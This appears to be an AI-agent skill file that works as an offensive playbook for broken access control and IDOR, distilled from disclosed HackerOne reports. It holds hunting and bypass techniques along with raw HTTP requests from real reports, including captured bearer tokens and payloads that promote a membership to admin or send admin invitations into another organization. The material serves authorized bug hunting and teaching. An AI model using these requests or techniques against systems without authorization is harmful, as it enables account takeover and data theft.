---
name: access-control-idor
description: "Broken Access Control & IDOR offensive playbook from 688 disclosed HackerOne reports (67 critical, 141 high, 306 medium, 174 low). Use when hunting or reviewing broken access control & idor. Triggers: access, allowed, attacker, idor, information."
license: "For authorized security testing and education only."
---

# Broken Access Control & IDOR

> Distilled from **688** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

The server trusts a client-supplied identifier (numeric ID, UUID, slug, filename, GraphQL node ID, tenant/org ID) without checking that the current principal is allowed to act on that object. Includes classic IDOR, missing function-level access control, and horizontal/vertical authorization gaps.

## Where to hunt

- Enumerate every request that carries an object reference: `?id=`, `/users/{id}`, `/api/v2/orders/{uuid}`, `report_id`, `file`, base64/GraphQL global IDs.
- Create two accounts (A and B) in different orgs/tenants. Replay A's requests with B's session and swap the object IDs.
- Test all HTTP verbs on the same endpoint (GET may be protected while PUT/DELETE/PATCH is not).
- Look for hidden/admin functionality reachable by URL even when the UI hides it (forced browsing).
- Check indirect references: exported files, invoice PDFs, avatar URLs, signed URLs with predictable paths.

## Exploitation playbook

- Increment/decrement IDs, or substitute B's known object IDs, and confirm you read or mutate another tenant's data.
- Swap UUIDs harvested from other endpoints (search, autocomplete, notifications, webhooks) that leak IDs you shouldn't reach.
- For GraphQL, decode `Z2lkOi8v...` node IDs, change the numeric suffix, re-encode, and refetch.
- Combine read-IDOR (leak an ID) with write-IDOR (act on it) to chain into full account/object takeover.

## Bypass techniques

- Wrap the ID in an array (`id[]=123`) or JSON to dodge a naive equality check.
- Add the parameter twice (HTTP parameter pollution) so the authz check reads one value and the DB reads the other.
- Path/case tricks: `/Admin/`, trailing slash, `..;/`, URL-encoded separators to reach protected routes.
- Downgrade the object reference type (e.g. supply numeric ID where the app expected a signed token).

## Impact & escalation

- Horizontal: read/modify peer records → mass data exfiltration by enumeration.
- Vertical: reach admin-only functions to grant yourself roles, reset others' credentials, or read secrets.

## Remediation

- Enforce object-level authorization server-side on every request, keyed to the authenticated principal, not the supplied ID.
- Use unguessable, per-user-scoped references and deny-by-default checks in a central policy layer.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#809816](https://hackerone.com/reports/809816)  -  Organization Takeover
*high, $500*

```http
POST /graphql HTTP/1.1
Host: console.helium.com
Content-Length: 488
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba310…

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
# … truncated …
```

### 2. [#809816](https://hackerone.com/reports/809816)  -  Organization Takeover
*high, $500*

```http
PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
Host: console.helium.com
Content-Length: 31
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba310…

{"membership":{"role":"admin"}}
```

### 3. [#809816](https://hackerone.com/reports/809816)  -  Organization Takeover
*high, $500*

```http
POST /graphql HTTP/1.1
Host: console.helium.com
Content-Length: 488
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQyMDk5LCJpYXQiOjE1ODMyNTU2OTksImlzcyI6ImNvbnNvbGUiLCJqdGkiOiI0YWM5ZDk2OC1hMGYwLTQ5MDgtODZmMi0wNTE3ZjE3OTE0NjMiLCJuYmYiOjE1ODMyNTU2OTgsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.rShCG6pW0Pjkd_dd8KTslyKPU38jrzhMrn39dkxdIqhePsCFx4FsEmNSKXTNm2zD02dPZNkp_N_FGtcen8kaeQ
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba310…

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
# … truncated …
```

### 4. [#835005](https://hackerone.com/reports/835005)  -  Organization Takeover via invitation API
*medium, $100*

```http
POST /graphql HTTP/1.1
Host: console.helium.com
Content-Length: 469
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/dashboard
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22;…

{"operationName":"PaginatedOrganizationsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\n  organizations(page: $page, pageSize: $pageSize) {\n    entries {\n      ...OrganizationFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment OrganizationFragment on Organization {\n  id\n  name\n  inserted_at\n  __typename\n}\n"}
# … truncated …
```

### 5. [#835005](https://hackerone.com/reports/835005)  -  Organization Takeover via invitation API
*medium, $100*

```http
POST /api/invitations HTTP/1.1
Host: console.helium.com
Content-Length: 125
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
Content-Type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22;…

{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"883b0a46-e4cf-4315-af4f-4226d1ada561"}}
```

### 6. [#835005](https://hackerone.com/reports/835005)  -  Organization Takeover via invitation API
*medium, $100*

```http
POST /api/invitations HTTP/1.1
Host: console.helium.com
Content-Length: 126
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
Content-Type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22;…

{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"cb23000e-65b3-4628-9ede-656ffa0d5aa8"}}
```

More payloads: see [payloads.md](payloads.md) (418 curated).

## Recurring patterns in this dataset

Most frequent terms across the 688 reports (term (count)): `access` (375), `allowed` (295), `attacker` (183), `idor` (143), `information` (116), `api` (111), `discovered` (108), `unauthorized` (104), `other` (99), `control` (97), `email` (95), `permission` (94), `private` (90), `endpoint` (87), `request` (79), `delete` (71), `authorization` (71), `data` (70)

## Worked example  -  [report #2293343](https://hackerone.com/reports/2293343)

*Account Takeover via Password Reset without user interactions* (critical, $35,000)

> The report submitted to GitLab described a vulnerability that allowed account takeover via the password reset form. The vulnerability was triggered by modifying the JSON request to include the victim's email along with the attacker's email. This resulted in the password reset email being sent to both emails, allowing the attacker to access the victim's account by using the reset link.…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#2293343](https://hackerone.com/reports/2293343) | critical | $35,000 | gitlab | Account Takeover via Password Reset without user interactions |
| [#391217](https://hackerone.com/reports/391217) | critical | $20,000 | valve | Getting all the CD keys of any game |
| [#743953](https://hackerone.com/reports/743953) | critical | $20,000 | gitlab | Steal private objects of other projects via project import |
| [#767770](https://hackerone.com/reports/767770) | critical | $20,000 | gitlab | Private objects exposed through project import |
| [#394329](https://hackerone.com/reports/394329) | critical | $8,000 | chaturbate | Account Takeover via billing |
| [#1330529](https://hackerone.com/reports/1330529) | critical | $3,250 | eternal | Claiming the listing of a non-delivery restaurant through OTP manipulation |
| [#1250037](https://hackerone.com/reports/1250037) | critical | $3,000 | stripe | Email change or personal data change on the account. |
| [#1038658](https://hackerone.com/reports/1038658) | critical | $1,337 | 8x8-bounty | Any meeting chat history can be read and modified by an arbitrary user |

*See [reference.md](reference.md) for all 688 reports in this class.*
